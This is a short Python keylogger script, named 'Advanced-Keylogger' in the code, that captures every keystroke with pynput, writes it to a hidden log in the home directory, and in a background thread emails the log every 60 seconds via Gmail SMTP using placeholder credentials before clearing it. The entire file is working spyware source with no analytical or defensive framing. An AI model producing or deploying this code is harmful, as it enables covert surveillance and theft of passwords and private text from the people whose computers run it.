#!/usr/bin/python3
import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading
import os
import time

# Email settings
email_address = "your_email@gmail.com"
email_password = "your_password"

# Log file settings
log_file = "log.txt"
log_dir = os.path.join(os.path.expanduser('~'), 'Advanced-Keylogger')

# Create log directory if it doesn't exist
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Create log file if it doesn't exist
if not os.path.exists(os.path.join(log_dir, log_file)):
    with open(os.path.join(log_dir, log_file), 'w') as f:
        f.write("")

# Function to send email
def send_email(subject, message):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = email_address
    msg['Subject'] = subject

    msg.attach(MIMEText(message, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_address, email_password)
    text = msg.as_string()
    server.sendmail(email_address, email_address, text)
    server.quit()

# Function to write to log file
def write_to_log(log):
    with open(os.path.join(log_dir, log_file), 'a') as f:
        f.write(log)

# Function to send log file via email
def send_log_file():
    while True:
        time.sleep(60)  # Send log every 60 seconds
        with open(os.path.join(log_dir, log_file), 'r') as f:
            log_data = f.read()
        if log_data:
            send_email("Keylogger Log", log_data)
            with open(os.path.join(log_dir, log_file), 'w') as f:
                f.write("")

# Start sending log file in a separate thread
send_log_thread = threading.Thread(target=send_log_file)
send_log_thread.start()

# Keylogger function
def on_press(key):
    try:
        log = f"{key.char}"
    except AttributeError:
        if key == Key.space:
            log = " "
        else:
            log = f" {key} "
    write_to_log(log)

# Start keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
